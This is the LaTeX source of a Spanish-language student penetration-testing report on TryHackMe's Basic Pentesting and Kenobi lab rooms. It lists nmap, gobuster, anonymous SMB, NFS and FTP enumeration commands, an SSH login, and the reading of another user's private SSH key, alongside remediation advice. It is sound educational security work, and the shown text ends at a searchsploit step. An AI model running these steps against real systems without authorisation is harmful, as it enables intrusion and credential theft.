\documentclass[11pt,a4paper]{article}

% =========================================================
% PAQUETES
% =========================================================
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{babel}
\babelprovide[main]{spanish}
\setlocalecaption{spanish}{contents}{Índice}
\setlocalecaption{spanish}{figure}{Figura}
\setlocalecaption{spanish}{part}{Parte}
\usepackage[a4paper,margin=2.3cm,headheight=15pt]{geometry}
\usepackage{graphicx}
\usepackage{xcolor}
\usepackage{colortbl}
\usepackage{array}
\usepackage{longtable}
\usepackage{booktabs}
\usepackage{tabularx}
\usepackage{float}
\usepackage{fancyhdr}
\usepackage{lastpage}
\usepackage{hyperref}
\usepackage{enumitem}
\usepackage{titlesec}
\usepackage{tcolorbox}
\usepackage{listings}
\usepackage{caption}
\usepackage{parskip}
\usepackage[expansion=false]{microtype}

% =========================================================
% CONFIGURACIÓN GENERAL
% =========================================================

\hypersetup{
    colorlinks=true,
    linkcolor=blue!50!black,
    urlcolor=blue!50!black,
    citecolor=blue!50!black,
    pdftitle={Informe de Pentesting - INSECUR S.A.},
    pdfauthor={Camila Olivera},
    pdfsubject={Actividad A08 - Hacking Ético}
}

\setlength{\parindent}{0pt}
\setlength{\parskip}{6pt}

\definecolor{insecblue}{HTML}{17365D}
\definecolor{critical}{HTML}{F4CCCC}
\definecolor{high}{HTML}{FCE5CD}
\definecolor{medium}{HTML}{FFF2CC}
\definecolor{low}{HTML}{D9EAD3}
\definecolor{lightblue}{HTML}{EAF2F8}
\definecolor{darkgray}{HTML}{444444}

\titleformat{\section}
{\Large\bfseries\color{insecblue}}
{\thesection.}{0.5em}{}

\titleformat{\subsection}
{\large\bfseries\color{insecblue}}
{\thesubsection.}{0.5em}{}

\titleformat{\subsubsection}
{\normalsize\bfseries\color{darkgray}}
{\thesubsubsection.}{0.5em}{}

\pagestyle{fancy}
\fancyhf{}
\lhead{\small INSECUR S.A. -- Actividad A08}
\rhead{\small Hacking Ético}
\cfoot{\small Página \thepage\ de \pageref{LastPage}}
\renewcommand{\headrulewidth}{0.4pt}
\renewcommand{\footrulewidth}{0.4pt}

% =========================================================
% CONFIGURACIÓN DE CÓDIGO
% =========================================================

\lstset{
    basicstyle=\ttfamily\small,
    breaklines=true,
    frame=single,
    backgroundcolor=\color{gray!8},
    columns=fullflexible,
    keepspaces=true
}

% =========================================================
% COMANDOS AUXILIARES
% =========================================================

\newcommand{\evidence}[2]{
\begin{figure}[H]
    \centering
    \includegraphics[width=0.94\textwidth]{#1}
    \caption{#2}
\end{figure}
}

\newcommand{\findingbox}[3]{
\begin{tcolorbox}[
    colback=#1,
    colframe=black!35,
    title=\textbf{#2},
    fonttitle=\bfseries
]
#3
\end{tcolorbox}
}

% =========================================================
% DOCUMENTO
% =========================================================

\begin{document}

% =========================================================
% PORTADA
% =========================================================

\begin{titlepage}
\centering

\vspace*{1.5cm}

{\Huge\bfseries\color{insecblue} INSECUR S.A.}

\vspace{0.4cm}

{\Large Seguridad Aplicada a Sistemas de Información}

\vspace{1.5cm}

\begin{tcolorbox}[
    colback=lightblue,
    colframe=insecblue,
    width=0.88\textwidth,
    arc=3mm
]
\centering
{\LARGE\bfseries Actividad A08-- HACKING ÉTICO}\\[0.3cm]
{\Huge\bfseries INFORME DE PENTESTING}\\[0.4cm]
{\Large Basic Pentesting + Kenobi}
\end{tcolorbox}
\vspace{1.5cm}

\begin{tabular}{>{\bfseries}l l}
Cliente: & INSECUR S.A.\\
Laboratorio: & TryHackMe\\
Salas evaluadas: & Basic Pentesting + Kenobi\\
Alumna: & Camila Olivera\\
Usuario TryHackMe: & camiluolivera2506\\
Correo institucional: & oliveracamila@uch.edu.ar\\
Correo personal: & camiluolivera2506@gmail.com\\
Período de trabajo: & 25/09/2026 -- 30/09/2026\\
Branch prevista: & Olivera-Camila\\
\end{tabular}

\vfill

{\large Documento elaborado con fines exclusivamente académicos}

\vspace{0.5cm}

{\large 2026}

\end{titlepage}
\pagenumbering{arabic}
\setcounter{page}{1}

% =========================================================
% CONTROL DEL DOCUMENTO
% =========================================================

\section*{Control del documento}

\begin{center}
\begin{tabularx}{\textwidth}{|l|X|}
\hline
\textbf{Campo} & \textbf{Información}\\
\hline
Documento & Informe de Pentesting\\
\hline
Actividad & A08 -- Hacking Ético\\
\hline
Cliente & INSECUR S.A.\\
\hline
Entorno & TryHackMe\\
\hline
Sala & Basic Pentesting\\
\hline
Responsable & Camila Olivera\\
\hline
Fecha de inicio & 25/09/2026\\
\hline
Fecha de cierre & 26/09/2026\\
\hline
Versión & 1.0\\
\hline
\end{tabularx}
\end{center}

\vspace{1cm}

\begin{tcolorbox}[colback=yellow!8,colframe=orange!60!black]
\textbf{Clasificación:} Documento académico de evaluación de seguridad realizado
exclusivamente sobre el entorno autorizado de TryHackMe indicado en el alcance.
\end{tcolorbox}

\newpage

% =========================================================
% ÍNDICE
% =========================================================

\tableofcontents

\newpage

% =========================================================
% 1. RESUMEN EJECUTIVO
% =========================================================

\part{Núcleo obligatorio}

\section{Resumen ejecutivo}

Durante la evaluación de seguridad realizada sobre el entorno autorizado de
TryHackMe se identificaron cuatro hallazgos relevantes durante las fases de
reconocimiento, enumeración, explotación y post-explotación.

Los hallazgos identificados fueron:

\begin{itemize}
    \item exposición de información interna mediante un directorio web accesible;
    \item utilización de credenciales que permitieron acceso remoto mediante SSH;
    \item exposición de una clave privada SSH perteneciente a otro usuario;
    \item acceso anónimo a un recurso compartido SMB.
\end{itemize}

Los hallazgos afectan principalmente la confidencialidad de la información y
los controles de autenticación y autorización del sistema.

\begin{center}
\begin{tabular}{|c|c|c|}
\hline
\textbf{Severidad} & \textbf{Cantidad} & \textbf{Hallazgos}\\
\hline
\cellcolor{critical}\textbf{Crítica} & 0 & --\\
\hline
\cellcolor{high}\textbf{Alta} & 1 & H-03\\
\hline
\cellcolor{medium}\textbf{Media} & 3 & H-01, H-02, H-04\\
\hline
\cellcolor{low}\textbf{Baja} & 0 & --\\
\hline
\textbf{Total} & \textbf{4} & \textbf{H-01 a H-04}\\
\hline
\end{tabular}
\end{center}

Las recomendaciones principales se orientan a fortalecer los controles de
acceso, aplicar políticas robustas de autenticación, restringir recursos
compartidos, proteger las claves privadas y separar adecuadamente los recursos
de desarrollo de los entornos destinados a producción.

% =========================================================
% 2. DATOS GENERALES
% =========================================================

\section{Datos generales}

\subsection{Identificación de la evaluación}

\begin{center}
\begin{tabularx}{\textwidth}{|l|X|}
\hline
\textbf{Elemento} & \textbf{Detalle}\\
\hline
Cliente & INSECUR S.A.\\
\hline
Actividad & A08 -- Hacking Ético\\
\hline
Entorno & TryHackMe\\
\hline
Sala & Basic Pentesting\\
\hline
Usuario THM & camiluolivera2506\\
\hline
Alumna & Camila Olivera\\
\hline
Fecha de inicio & 25/09/2026\\
\hline
Fecha de cierre & 26/09/2026\\
\hline
\end{tabularx}
\end{center}

\subsection{Objetivo}

El objetivo de la actividad fue realizar una evaluación de seguridad controlada
sobre el entorno autorizado de TryHackMe, aplicando técnicas de reconocimiento,
enumeración, identificación de vulnerabilidades, explotación controlada y
post-explotación.

La evaluación tuvo como finalidad identificar debilidades de seguridad,
documentar evidencias y proponer medidas de mitigación.

\subsection{Alcance}

El alcance estuvo limitado al laboratorio autorizado de TryHackMe
correspondiente a la actividad práctica.

No se realizaron actividades fuera del entorno autorizado.

\subsection{Reglas de operación}

Las actividades fueron realizadas con fines exclusivamente académicos y sobre
el objetivo autorizado.

Las acciones se limitaron a técnicas necesarias para la evaluación del
laboratorio, evitando la extracción innecesaria de información sensible.

% =========================================================
% 3. PRE-PENTESTING
% =========================================================

\section{Pre-pentesting}

\subsection{Autorización}

La evaluación se realizó dentro del alcance autorizado establecido para la
Actividad A08 -- Hacking Ético, utilizando TryHackMe como entorno controlado.

\subsection{Metodología}

El trabajo siguió un flujo de pentesting compuesto por:

\begin{enumerate}
    \item reconocimiento;
    \item escaneo;
    \item enumeración;
    \item identificación de vulnerabilidades;
    \item explotación controlada;
    \item post-explotación;
    \item documentación;
    \item recomendaciones y cierre.
\end{enumerate}

\subsection{Herramientas utilizadas}

Durante la actividad se utilizaron herramientas disponibles en Kali Linux,
entre ellas:

\begin{itemize}
    \item Nmap;
    \item Gobuster;
    \item cURL;
    \item smbclient;
    \item cliente SSH;
    \item herramientas de terminal de Linux;
    \item OpenVPN para conexión al entorno de TryHackMe.
\end{itemize}

% =========================================================
% 4. RECONOCIMIENTO
% =========================================================

\section{Reconocimiento}

\subsection{Conectividad}

El objetivo inicial documentado fue:

\begin{lstlisting}
10.64.160.174
\end{lstlisting}

La conectividad fue comprobada mediante:

\begin{lstlisting}
ping -c 4 10.64.160.174
\end{lstlisting}

Se obtuvieron cuatro respuestas, sin pérdida de paquetes.

\evidence{
evidencias/reconocimiento/reconocimiento_BP-04_ping.png
}{
Prueba de conectividad con el objetivo autorizado.
}

\subsection{Entorno VPN}

La conexión al laboratorio se realizó mediante OpenVPN.

La interfaz utilizada permitió establecer conectividad entre Kali Linux y el
entorno de TryHackMe.

\evidence{
evidencias/reconocimiento/BP-00_vpn_tun0.png
}{
Interfaz de red utilizada para la conexión al laboratorio.
}

% =========================================================
% 5. ESCANEO Y ENUMERACIÓN
% =========================================================

\section{Escaneo y enumeración}

\subsection{Nmap}

Se realizó un escaneo de los principales puertos utilizando detección de
servicios y scripts básicos:

\begin{lstlisting}
nmap -sC -sV --top-ports 1000 -T3 \
-oA /home/kali/TP_THM/evidencias/escaneo/BP-03_nmap \
10.64.160.174
\end{lstlisting}

El análisis permitió identificar, entre otros, los siguientes servicios:

\begin{center}
\begin{tabular}{|c|l|l|}
\hline
\textbf{Puerto} & \textbf{Servicio} & \textbf{Versión / información}\\
\hline
22 & SSH & OpenSSH 8.2p1 Ubuntu\\
\hline
80 & HTTP & Apache httpd 2.4.41\\
\hline
139 & NetBIOS/SMB & Samba\\
\hline
445 & SMB & Samba\\
\hline
8009 & AJP13 & Apache Jserv\\
\hline
8080 & HTTP & Apache Tomcat 9.0.7\\
\hline
\end{tabular}
\end{center}

\evidence{
evidencias/escaneo/escaneo_BP-03_nmap-01.png
}{
Resultado del escaneo Nmap -- servicios y puertos identificados.
}

\evidence{
evidencias/escaneo/escaneo_BP-03_nmap-02.png
}{
Continuación del resultado del escaneo Nmap.
}

\subsection{Enumeración web}

Se realizó una consulta HTTP inicial:

\begin{lstlisting}
curl -i http://10.64.160.174/
\end{lstlisting}

El servidor respondió correctamente y mostró una página de mantenimiento con
una referencia a una sección de notas de desarrollo.

Posteriormente se utilizó Gobuster:

\begin{lstlisting}
gobuster dir -u http://10.64.160.174/ \
-w /usr/share/wordlists/dirb/common.txt \
-o /home/kali/TP_THM/evidencias/escaneo/BP-04_gobuster80.txt
\end{lstlisting}

Entre los resultados se identificó el recurso:

\begin{lstlisting}
/development/
\end{lstlisting}

\evidence{
evidencias/escaneo/escaneo_BP-04_gobuster80.png
}{
Enumeración de directorios mediante Gobuster.
}

El contenido del directorio fue consultado mediante:

\begin{lstlisting}
curl -s http://10.64.160.174/development/
\end{lstlisting}

Se identificaron los archivos:

\begin{itemize}
    \item \texttt{dev.txt}
    \item \texttt{j.txt}
\end{itemize}

\evidence{
evidencias/escaneo/escaneo_BP-05_development_dev.png
}{
Contenido del archivo dev.txt.
}

\evidence{
evidencias/escaneo/escaneo_BP-06_development_j.png
}{
Contenido del archivo j.txt.
}

\subsection{Enumeración SMB}

Se realizó una enumeración de recursos SMB:

\begin{lstlisting}
smbclient -L //10.64.160.174 -N
\end{lstlisting}

Se identificó el recurso compartido \texttt{Anonymous}.

Posteriormente se accedió al recurso:

\begin{lstlisting}
smbclient //10.64.160.174/Anonymous -N
\end{lstlisting}

Dentro del recurso se encontró el archivo:

\begin{lstlisting}
staff.txt
\end{lstlisting}

\evidence{
evidencias/escaneo/escaneo_H-04_smb_anonymous.png
}{
Enumeración y acceso al recurso compartido Anonymous.
}

El archivo fue descargado mediante \texttt{get} y posteriormente visualizado.

\evidence{
evidencias/escaneo/escaneo_H-04_smb_staff.png
}{
Contenido de staff.txt obtenido desde el recurso SMB.
}

% =========================================================
% 6. HALLAZGOS
% =========================================================

\section{Hallazgos por fase}

\subsection{H-01 -- Exposición de información interna mediante recurso web accesible}

\findingbox{medium}{Severidad: MEDIA}{
\textbf{ID:} H-01\\
\textbf{Fase:} Escaneo / Enumeración\\
\textbf{CWE:} CWE-200 -- Exposure of Sensitive Information to an Unauthorized Actor\\
\textbf{CVE:} No aplica.
}

\subsubsection{Descripción}

Se identificó el directorio web \texttt{/development/}, accesible sin
autenticación.

El contenido incluía archivos relacionados con información de desarrollo y
configuración interna. Entre la información observada se encuentra una
referencia a Apache Struts 2.5.12, información sobre SMB y Apache y notas
internas relacionadas con credenciales.

La evidencia disponible demuestra exposición de información. No se afirma que
la versión mencionada de Struts haya sido explotada durante esta evaluación.

\subsubsection{Componente afectado}

Servidor web Apache y directorio:

\begin{lstlisting}
/development/
\end{lstlisting}

\subsubsection{Evidencia}

\begin{itemize}
    \item \texttt{escaneo\_BP-04\_gobuster80.png}
    \item \texttt{escaneo\_BP-05\_development\_dev.png}
    \item \texttt{escaneo\_BP-06\_development\_j.png}
    \item \texttt{BP-04\_gobuster80.txt}
\end{itemize}

\subsubsection{Impacto}

El principal impacto identificado corresponde a la confidencialidad, debido a
que información destinada al desarrollo se encuentra disponible desde un
recurso web accesible.

\subsubsection{Salvaguardas recomendadas}

\begin{itemize}
    \item eliminar notas y archivos de desarrollo del entorno productivo;
    \item restringir el acceso al directorio;
    \item implementar controles de autenticación y autorización;
    \item separar los entornos de desarrollo y producción;
    \item revisar periódicamente el contenido publicado por el servidor web.
\end{itemize}

\subsubsection{Riesgo residual}

Bajo, una vez aplicados los controles de acceso y eliminada la información de
desarrollo del entorno expuesto.

% ---------------------------------------------------------

\subsection{H-02 -- Credenciales débiles que permiten acceso SSH}

\findingbox{medium}{Severidad: MEDIA}{
\textbf{ID:} H-02\\
\textbf{Fase:} Explotación\\
\textbf{CWE:} CWE-521 -- Weak Password Requirements\\
\textbf{CVE:} No aplica.
}

\subsubsection{Descripción}

El servicio SSH identificado en el puerto 22 permitió validar acceso remoto
utilizando las credenciales correspondientes al usuario \texttt{jan}.

Una vez establecida la sesión, se verificó la identidad mediante:

\begin{lstlisting}
whoami
id
\end{lstlisting}

La cuenta correspondía a:

\begin{lstlisting}
jan
\end{lstlisting}

Es importante aclarar que durante la evaluación la herramienta Hydra no
permitió determinar exitosamente la contraseña. Por este motivo, este informe
no atribuye a Hydra el descubrimiento de las credenciales.

\subsubsection{Componente afectado}

Servicio SSH y cuenta de usuario \texttt{jan}.

\subsubsection{Evidencia}

\evidence{
evidencias/explotacion/explotacion_BP-05_acceso_ssh_jan-01.png
}{
Inicio de la conexión SSH al usuario jan.
}

\evidence{
evidencias/explotacion/explotacion_BP-05_acceso_ssh_jan-02.png
}{
Sesión SSH establecida como usuario jan.
}

\subsubsection{Impacto}

El acceso remoto a una cuenta de usuario puede permitir acceso no autorizado a
recursos del sistema, dependiendo de los permisos asociados a la cuenta.

El impacto observado durante esta evaluación se concentra principalmente en
confidencialidad e integridad.

\subsubsection{Salvaguardas recomendadas}

\begin{itemize}
    \item utilizar contraseñas robustas y únicas;
    \item preferir autenticación mediante claves SSH protegidas;
    \item restringir el acceso SSH a usuarios y redes autorizadas;
    \item implementar MFA cuando el entorno lo permita;
    \item aplicar mecanismos de limitación de intentos de autenticación;
    \item revisar periódicamente las cuentas existentes.
\end{itemize}

\subsubsection{Riesgo residual}

Bajo, después de aplicar controles de autenticación y restricción de acceso.

% ---------------------------------------------------------

\subsection{H-03 -- Exposición de clave privada SSH de otro usuario}

\findingbox{high}{Severidad: ALTA}{
\textbf{ID:} H-03\\
\textbf{Fase:} Post-explotación\\
\textbf{CWE:} CWE-732 -- Incorrect Permission Assignment for Critical Resource\\
\textbf{CVE:} No aplica.
}

\subsubsection{Descripción}

Durante la enumeración del sistema con la cuenta \texttt{jan}, se identificó
que era posible acceder al directorio personal del usuario \texttt{kay}.

Dentro de dicho directorio se identificó:

\begin{lstlisting}
/home/kay/.ssh/id_rsa
\end{lstlisting}

La clave privada pudo ser leída. La evidencia mostró que la clave se encontraba
protegida mediante cifrado y passphrase.

Por lo tanto, la evaluación demuestra exposición de una clave privada, pero no
se afirma que la cuenta \texttt{kay} haya sido comprometida mediante dicha
clave.

\subsubsection{Componente afectado}

Sistema de archivos Linux y directorio:

\begin{lstlisting}
/home/kay/.ssh/
\end{lstlisting}

\subsubsection{Evidencia}

\evidence{
evidencias/explotacion/explotacion_BP-06_enumeracion_jan_kay.png
}{
Enumeración del directorio personal del usuario kay.
}

\evidence{
evidencias/explotacion/explotacion_BP-07_kay_ssh_key.png
}{
Identificación de la clave privada SSH de kay.
}

\evidence{
evidencias/explotacion/explotacion_BP-08_kay_id_rsa_encrypted.png
}{
Primeras líneas de la clave privada, donde se observa que se encuentra cifrada.
}

\subsubsection{Impacto}

La exposición de una clave privada constituye una debilidad importante de
control de acceso. Si una clave privada pudiera utilizarse sin protección
adicional, podría permitir autenticación como el usuario propietario.

En este caso, la clave observada estaba cifrada, por lo que no se demostró su
utilización para acceder como \texttt{kay}.

El impacto potencial comprende confidencialidad e integridad.

\subsubsection{Salvaguardas recomendadas}

\begin{itemize}
    \item aplicar permisos restrictivos sobre directorios personales;
    \item garantizar que las claves privadas sean accesibles únicamente por su
    propietario;
    \item utilizar passphrases robustas;
    \item implementar procedimientos de gestión y rotación de claves;
    \item eliminar claves innecesarias;
    \item revisar periódicamente permisos del sistema de archivos.
\end{itemize}

\subsubsection{Riesgo residual}

Bajo, siempre que las claves privadas permanezcan cifradas y sean accesibles
exclusivamente por sus propietarios.

% ---------------------------------------------------------

\subsection{H-04 -- Acceso anónimo a recurso compartido SMB}

\findingbox{medium}{Severidad: MEDIA}{
\textbf{ID:} H-04\\
\textbf{Fase:} Escaneo / Enumeración\\
\textbf{CWE:} CWE-306 -- Missing Authentication for Critical Function\\
\textbf{CVE:} No aplica.
}

\subsubsection{Descripción}

Se identificó un recurso compartido SMB denominado \texttt{Anonymous} que
permitió acceso sin autenticación.

Dentro del recurso se encontró el archivo \texttt{staff.txt}, cuyo contenido
incluía información interna dirigida al personal.

\subsubsection{Componente afectado}

Servicio Samba/SMB y recurso compartido:

\begin{lstlisting}
Anonymous
\end{lstlisting}

\subsubsection{Impacto}

El acceso anónimo puede facilitar la consulta o extracción de información
interna por usuarios no autenticados.

El impacto observado corresponde principalmente a la confidencialidad.

\subsubsection{Salvaguardas recomendadas}

\begin{itemize}
    \item deshabilitar el acceso anónimo;
    \item exigir autenticación para los recursos compartidos;
    \item aplicar principio de mínimo privilegio;
    \item revisar periódicamente los permisos de los recursos SMB;
    \item eliminar información interna innecesaria de recursos compartidos.
\end{itemize}

\subsubsection{Riesgo residual}

Bajo, luego de deshabilitar el acceso anónimo y revisar los permisos.

% =========================================================
% 6.4 RESUMEN
% =========================================================

\subsection{Resumen de hallazgos}

\begin{center}
\begin{longtable}{|p{1.2cm}|p{4.4cm}|p{2.1cm}|p{3.2cm}|}
\hline
\textbf{ID} & \textbf{Hallazgo} & \textbf{Severidad} & \textbf{Impacto principal}\\
\hline
H-01 & Exposición de información interna mediante recurso web & Media & Confidencialidad\\
\hline
H-02 & Credenciales débiles con acceso SSH & Media & Confidencialidad / Integridad\\
\hline
H-03 & Exposición de clave privada SSH & Alta & Confidencialidad / Integridad\\
\hline
H-04 & Acceso anónimo a recurso SMB & Media & Confidencialidad\\
\hline
\end{longtable}
\end{center}

% =========================================================
% 7. RECOMENDACIONES
% =========================================================

\section{Recomendaciones post-pentesting}

\subsection{Recomendaciones técnicas}

\subsubsection{Protección de recursos web}

Se recomienda eliminar recursos de desarrollo del entorno productivo y
restringir mediante autenticación cualquier directorio que deba permanecer
accesible únicamente para personal autorizado.

\subsubsection{Fortalecimiento de SSH}

Se recomienda fortalecer las credenciales, limitar el acceso remoto, utilizar
claves SSH adecuadamente protegidas y considerar mecanismos adicionales de
autenticación.

\subsubsection{Protección de claves privadas}

Las claves privadas deben permanecer accesibles únicamente por sus propietarios.
Se deben aplicar permisos restrictivos, utilizar passphrases y establecer
procedimientos de gestión y rotación.

\subsubsection{Seguridad de SMB}

Se recomienda deshabilitar los recursos anónimos y establecer autenticación y
autorización explícitas para cada recurso compartido.

\subsection{Recomendaciones administrativas}

\begin{itemize}
    \item establecer una política formal de contraseñas;
    \item realizar revisiones periódicas de usuarios y permisos;
    \item establecer procedimientos de ciclo de vida para claves SSH;
    \item capacitar al personal sobre protección de credenciales;
    \item realizar revisiones periódicas de configuraciones expuestas;
    \item mantener separación entre desarrollo y producción;
    \item documentar los cambios de configuración de servicios críticos.
\end{itemize}

% =========================================================
% 8. PROTOCOLO DE CONTINGENCIA
% =========================================================

\section{Protocolo de contingencia}

\subsection{Escenario de contingencia}

Se considera como escenario de contingencia un compromiso de una cuenta de
usuario mediante credenciales débiles y el posterior acceso no autorizado a
recursos internos del sistema.

\subsection{Impacto sobre la continuidad del negocio}

Un incidente de estas características podría afectar la confidencialidad de
la información y, dependiendo de los permisos de la cuenta comprometida,
también la integridad de recursos.

Las actividades de contención y recuperación podrían requerir una interrupción
temporal de determinados servicios.

\subsection{Plan de respuesta}

\subsubsection{1. Activación}

El protocolo deberá activarse ante:

\begin{itemize}
    \item detección de accesos SSH no autorizados;
    \item actividad anómala de autenticación;
    \item acceso inesperado a recursos sensibles;
    \item alertas provenientes de mecanismos de monitoreo;
    \item evidencia de exposición de credenciales o claves.
\end{itemize}

\subsubsection{2. Contención -- primeros 15 minutos}

Las primeras acciones deberán estar orientadas a evitar la propagación del
incidente:

\begin{enumerate}
    \item deshabilitar las cuentas comprometidas;
    \item revocar las claves SSH potencialmente expuestas;
    \item restringir temporalmente el acceso SSH;
    \item deshabilitar recursos SMB anónimos;
    \item aislar el servidor si fuera necesario;
    \item preservar logs y evidencias;
    \item evitar modificaciones innecesarias sobre el sistema afectado.
\end{enumerate}

\subsubsection{3. Recuperación}

Una vez contenida la situación:

\begin{enumerate}
    \item corregir los permisos incorrectos;
    \item cambiar o rotar las credenciales comprometidas;
    \item generar nuevas claves SSH cuando corresponda;
    \item retirar recursos de desarrollo expuestos;
    \item revisar configuraciones de SMB y SSH;
    \item verificar respaldos disponibles;
    \item restaurar servicios de manera controlada;
    \item comprobar el funcionamiento seguro antes de volver a producción.
\end{enumerate}

\subsubsection{4. Comunicación}

El incidente deberá ser comunicado a los responsables correspondientes de
seguridad, infraestructura y dirección, siguiendo los procedimientos internos
y legales aplicables.

En caso de existir información perteneciente a terceros, deberá respetarse el
procedimiento correspondiente para su tratamiento y comunicación.

\subsubsection{5. Post-mortem}

Luego de la recuperación deberá elaborarse un informe que incluya:

\begin{itemize}
    \item causa del incidente;
    \item sistemas afectados;
    \item cuentas involucradas;
    \item información potencialmente expuesta;
    \item acciones realizadas;
    \item impacto;
    \item medidas correctivas;
    \item medidas preventivas.
\end{itemize}

\subsection{Objetivos de recuperación propuestos}

Los siguientes valores se proponen exclusivamente como objetivos académicos
para el ejercicio y no representan valores reales establecidos por INSECUR S.A.

\begin{center}
\begin{tabular}{|c|c|p{8cm}|}
\hline
\textbf{Indicador} & \textbf{Valor propuesto} & \textbf{Descripción}\\
\hline
RTO & 4 horas & Tiempo objetivo para recuperar la operación principal.\\
\hline
RPO & 1 hora & Pérdida máxima de información aceptable considerada para el ejercicio.\\
\hline
\end{tabular}
\end{center}

% =========================================================
% 9. CONCLUSIONES
% =========================================================

\section{Conclusiones}

La evaluación permitió aplicar un proceso de pentesting controlado sobre un
entorno de laboratorio autorizado, comenzando con reconocimiento y
enumeración, continuando con la validación de accesos y finalizando con
actividades de post-explotación y documentación.

Se identificaron cuatro hallazgos: exposición de información interna en un
recurso web, acceso remoto mediante credenciales de usuario, exposición de una
clave privada SSH y acceso anónimo a un recurso compartido SMB.

La evaluación también permitió comprobar la importancia de combinar controles
de autenticación, autorización, gestión de credenciales, permisos del sistema
de archivos y configuración segura de servicios.

Las recomendaciones propuestas buscan reducir la exposición de información,
fortalecer los controles de acceso y mejorar la protección de credenciales y
recursos compartidos.

% =========================================================
\newpage
% PARTE II -- SALA DE ELECCIÓN: KENOBI
% =========================================================

\newpage
\part{Sala de elección: Kenobi}

\section{Reconocimiento -- Kenobi}

\subsection{Objetivo}

La segunda parte de la evaluación correspondió a la sala
\textit{Kenobi} de TryHackMe, seleccionada como sala de elección dentro
de la actividad A08.

El objetivo fue identificar servicios expuestos, enumerar los recursos
disponibles, validar vulnerabilidades dentro del laboratorio autorizado y
documentar una cadena de explotación controlada hasta la obtención de
privilegios elevados.

\subsection{Identificación del objetivo}
Fecha de ejecución: 30/09/2026.\par

El objetivo asignado para la evaluación fue:

\begin{lstlisting}
10.64.134.243
\end{lstlisting}

La conectividad fue comprobada mediante:

\begin{lstlisting}
ping -c 4 10.64.134.243
\end{lstlisting}

Se obtuvieron cuatro respuestas sin pérdida de paquetes.

\evidence{
evidencias/reconocimiento/reconocimiento_KB-01_ping.png
}{
Prueba de conectividad con el objetivo de la sala Kenobi.
}

\subsection{Entorno de trabajo}

La evaluación se realizó desde Kali Linux mediante la conexión VPN
establecida con el entorno autorizado de TryHackMe.

La ruta hacia el objetivo fue verificada mediante la interfaz
\texttt{tun0}, utilizada para la comunicación con el laboratorio.

% =========================================================
% ESCANEO Y ENUMERACIÓN
% =========================================================

\section{Escaneo y enumeración -- Kenobi}

\subsection{Escaneo de puertos}

Se realizó un escaneo completo de puertos TCP para identificar los
servicios expuestos:

\begin{lstlisting}
nmap -p- --min-rate 5000 -T4 \
-oA ~/TP_THM/evidencias/escaneo/KB-02_nmap \
10.64.134.243
\end{lstlisting}

El análisis permitió identificar los siguientes puertos abiertos:

\begin{center}
\begin{tabular}{|c|l|}
\hline
\textbf{Puerto} & \textbf{Servicio identificado}\\
\hline
21 & FTP\\
\hline
22 & SSH\\
\hline
80 & HTTP\\
\hline
111 & RPCbind\\
\hline
139 & NetBIOS/SMB\\
\hline
445 & SMB\\
\hline
2049 & NFS\\
\hline
35437 & Nlockmgr\\
\hline
43057 & Mountd\\
\hline
48695 & Mountd\\
\hline
58469 & Mountd\\
\hline
\end{tabular}
\end{center}

\evidence{
evidencias/escaneo/escaneo_KB-02_nmap_puertos.png
}{
Resultado del escaneo completo de puertos TCP.
}

\subsection{Identificación de servicios}

Se realizó posteriormente detección de versiones y scripts básicos sobre
los puertos identificados:

\begin{lstlisting}
nmap -sC -sV \
-p 21,22,80,111,139,445,2049,35437,43057,48695,58469 \
-oA ~/TP_THM/evidencias/escaneo/KB-03_nmap_servicios \
10.64.134.243
\end{lstlisting}

Entre los servicios identificados se encontraron:

\begin{center}
\begin{tabular}{|c|l|l|}
\hline
\textbf{Puerto} & \textbf{Servicio} & \textbf{Versión / información}\\
\hline
21 & FTP & ProFTPD 1.3.5\\
\hline
22 & SSH & OpenSSH 8.2p1 Ubuntu\\
\hline
80 & HTTP & Apache 2.4.41 Ubuntu\\
\hline
111 & RPCbind & 2--4\\
\hline
139 & SMB & Samba\\
\hline
445 & SMB & Samba\\
\hline
2049 & NFS & NFS\\
\hline
35437 & Nlockmgr & 1--4\\
\hline
43057 & Mountd & 1--3\\
\hline
48695 & Mountd & 1--3\\
\hline
58469 & Mountd & 1--3\\
\hline
\end{tabular}
\end{center}

\evidence{
evidencias/escaneo/escaneo_KB-03_nmap_servicios-01.png
}{
Identificación de servicios mediante Nmap.
}

\evidence{
evidencias/escaneo/escaneo_KB-03_nmap_servicios-02.png
}{
Continuación del resultado de identificación de servicios.
}

\subsection{Enumeración NFS}

Se consultaron los recursos NFS exportados mediante:

\begin{lstlisting}
showmount -e 10.64.134.243
\end{lstlisting}

El servidor indicó la exportación:

\begin{lstlisting}
/var *
\end{lstlisting}

\evidence{
evidencias/escaneo/escaneo_KB-04_nfs_exports.png
}{
Recurso NFS exportado por el servidor.
}

También se consultaron los servicios RPC disponibles:

\begin{lstlisting}
rpcinfo -p 10.64.134.243
\end{lstlisting}

\evidence{
evidencias/escaneo/escaneo_KB-05_rpcinfo.png
}{
Servicios RPC identificados en el objetivo.
}

Se utilizó además el script de Nmap para complementar la enumeración:

\begin{lstlisting}
nmap -p 2049 --script nfs-showmount 10.64.134.243
\end{lstlisting}

\evidence{
evidencias/escaneo/escaneo_KB-06_nfs_showmount_script.png
}{
Consulta del servicio NFS mediante script de Nmap.
}

\subsection{Enumeración SMB}

Se realizó una consulta de los recursos compartidos mediante:

\begin{lstlisting}
smbclient -L //10.64.134.243 -N
\end{lstlisting}

Se identificaron los recursos:

\begin{itemize}
    \item \texttt{print\$};
    \item \texttt{anonymous};
    \item \texttt{IPC\$}.
\end{itemize}

\evidence{
evidencias/escaneo/escaneo_KB-07_smb_shares.png
}{
Recursos compartidos SMB identificados.
}

Posteriormente se accedió al recurso \texttt{anonymous} sin autenticación:

\begin{lstlisting}
smbclient //10.64.134.243/anonymous -N
\end{lstlisting}

Dentro del recurso se identificó el archivo:

\begin{lstlisting}
log.txt
\end{lstlisting}

\evidence{
evidencias/escaneo/escaneo_KB-08_smb_anonymous_log.png
}{
Archivo log.txt identificado en el recurso SMB anonymous.
}

\subsection{Enumeración de ProFTPD}

Se verificó el banner del servicio FTP:

\begin{lstlisting}
nc 10.64.134.243 21
\end{lstlisting}

El servicio respondió identificándose como:

\begin{lstlisting}
ProFTPD 1.3.5
\end{lstlisting}

\evidence{
evidencias/escaneo/escaneo_KB-09_proftpd_banner.png
}{
Banner del servicio ProFTPD.
}

Posteriormente se realizó una búsqueda de vulnerabilidades y exploits
públicamente documentados:

\begin{lstlisting}
searchsploit ProFTPD 1.3.5
\end{lstlisting}

